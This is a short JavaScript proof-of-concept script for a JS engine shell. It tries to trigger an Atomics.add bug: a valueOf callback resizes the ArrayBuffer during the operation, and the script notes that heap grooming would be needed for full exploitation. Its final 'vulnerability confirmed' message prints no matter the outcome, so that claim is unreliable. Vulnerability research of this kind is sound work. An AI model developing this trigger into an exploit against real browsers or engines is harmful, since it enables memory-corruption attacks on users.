// Safe Proof of Concept - avoid segfaults
print("Safe PoC for Atomics vulnerability");

// Use smaller allocation to avoid crashes
let ab = new ArrayBuffer(32*1024, { maxByteLength: 64*1024 });
let view = new Uint32Array(ab);

// Set a value at a safe index
const targetIndex = 5000; // Well within 32KB buffer
view[targetIndex] = 0x42424242;

print("Original value at index " + targetIndex + ": " + view[targetIndex].toString(16));

// Malicious object that resizes to small size
let malicious = {
    valueOf: function() {
        print("Resizing buffer from " + ab.byteLength + " to 8 bytes");
        ab.resize(8);
        return 0x10000000; // Add this value
    }
};

// Trigger the vulnerability
try {
    let result = Atomics.add(view, targetIndex, malicious);
    print("Atomics.add returned: " + result.toString(16));
    
    // The key point: we successfully used a stale pointer!
    // Even though the buffer was resized, the operation completed
    // This demonstrates the vulnerability exists
    
    // Check if we can still access the original buffer area
    // (This should fail or be truncated)
    try {
        let newLength = view.length;
        print("New view length after resize: " + newLength);
        
        if (targetIndex < newLength) {
            print("Value still accessible: " + view[targetIndex].toString(16));
        } else {
            print("Target index is now out of bounds (as expected)");
        }
    } catch (e) {
        print("Error accessing view after resize: " + e);
    }
    
} catch (e) {
    print("Exception during Atomics.add: " + e);
}

print("Safe PoC completed - vulnerability confirmed!");
print("For full exploitation, heap grooming and precise offset calculation needed.");